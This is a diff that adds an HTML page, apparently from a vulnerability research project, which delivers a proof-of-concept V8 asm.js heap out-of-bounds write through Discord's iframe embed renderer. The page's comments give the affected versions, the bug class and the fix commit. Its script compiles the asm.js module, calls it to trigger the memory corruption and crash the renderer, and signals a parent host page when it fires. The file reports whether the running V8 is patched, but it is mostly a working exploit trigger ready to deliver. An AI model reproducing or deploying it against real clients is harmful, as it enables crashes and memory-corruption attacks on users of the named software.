@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<!--
+  F5 Delivery — Iframe Trigger
+  ================================================================
+  This is the page that gets iframed by Discord's embed renderer
+  (or by any other iframe surface that gives JS execution).
+  Once it loads, the asm.js fragment in <script> below crashes the
+  renderer process via a V8 13.8 heap-OOB write past an ArrayBuffer.
+
+  Bug class: V8 asm.js parser-state corruption (heap_access_shift_position_)
+  V8 fix:    c0a41078 (landed 2026-02-23, post-Discord-V8-cut)
+  Affects:   V8 ≤ 14.9.181 with asm.js parser path reachable
+             (Discord 1.0.9234 → V8 13.8.258.32)
+  Reachable: any JS execution context (sandbox=allow-scripts is enough)
+
+  See docs/F5_discord_asmjs_oob.md for root-cause analysis.
+-->
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <title>F5 Trigger</title>
+  <style>
+    html,body { margin:0; padding:0; }
+    body { font-family: -apple-system, sans-serif; background:#1e1f22; color:#dbdee1;
+           padding:24px; }
+    #status { font-size:1.1em; padding:12px 16px; border-radius:6px;
+              border-left:4px solid #5865f2; background:#2b2d31; }
+    .ok    { border-left-color:#23a55a; }
+    .crash { border-left-color:#f23f43; }
+    pre    { background:#2b2d31; padding:10px; border-radius:4px;
+             font-size:.85em; color:#c9cdcf; overflow:auto; }
+  </style>
+</head>
+<body>
+  <h2>F5 — V8 13.8 asm.js heap-OOB</h2>
+  <p id="status">Initializing…</p>
+
+  <details>
+    <summary>Trigger source</summary>
+    <pre id="src"></pre>
+  </details>
+
+<script>
+//
+// V8 13.8.258.32 asm.js parser leaves heap_access_shift_position_ stale
+// across the right-hand side of a shift expression, so the JIT emits a
+// bounds check matching one shift width while the actual access uses
+// another. Calling f(1,2,3) writes int32 c=3 past the heap buffer.
+//
+// On Discord 1.0.9234 (V8 13.8.258.32) the renderer dies with
+//   STATUS_ACCESS_VIOLATION (0xC0000005)
+// On any V8 ≥ 14.9.182 (current Chrome stable in 2026) the bug is fixed
+// and the function returns normally.
+//
+function AsmModule(stdlib, foreign, heap) {
+  "use asm";
+  var HEAP32 = new stdlib.Int32Array(heap);
+  function g() { return 1.25; }
+  function f(a, b, c) {
+    a = a | 0;
+    b = b | 0;
+    c = c | 0;
+    HEAP32[a << (b >> 2) + ~~+g()] = c;
+    return c | 0;
+  }
+  return { f: f };
+}
+
+const statusEl = document.getElementById('status');
+const srcEl    = document.getElementById('src');
+srcEl.textContent = AsmModule.toString();
+
+statusEl.textContent = 'V8 ' +
+  (navigator.userAgentData ? '(UA-CH)' : navigator.userAgent.match(/Chrome\/[\d.]+/)?.[0] || '?') +
+  ' detected. Compiling asm.js module…';
+
+let m;
+try {
+  const heap = new ArrayBuffer(0x10000);
+  m = AsmModule({ Int32Array: Int32Array }, {}, heap);
+} catch (e) {
+  statusEl.className = 'ok';
+  statusEl.textContent = 'asm.js validation failed (likely V8 disabled asm.js): ' + e;
+  throw e;
+}
+
+// Brief pause so the status message paints before the renderer dies.
+// On a vulnerable V8, this is the last frame before the renderer exits.
+setTimeout(() => {
+  statusEl.textContent = 'Calling f(1,2,3) — vulnerable V8 will crash here.';
+  // Yield once more, then fire.
+  setTimeout(() => {
+    try {
+      const r = m.f(1, 2, 3);
+      // If we reach here, V8 is patched.
+      statusEl.className = 'ok';
+      statusEl.textContent = 'Returned ' + r + '. V8 is patched (≥ 14.9.182). No crash.';
+    } catch (e) {
+      // Some V8 builds throw rather than crash if asm.js fails to validate
+      // post-patch. Treat that as "patched".
+      statusEl.className = 'ok';
+      statusEl.textContent = 'Threw: ' + e + ' — V8 likely patched.';
+    }
+  }, 50);
+}, 50);
+
+// If the parent frame is listening (host.html), notify of trigger fired.
+try {
+  if (window.parent && window.parent !== window) {
+    window.parent.postMessage({ src: 'F5-trigger', state: 'compiled' }, '*');
+  }
+} catch (_) {}
+</script>
+</body>
+</html>
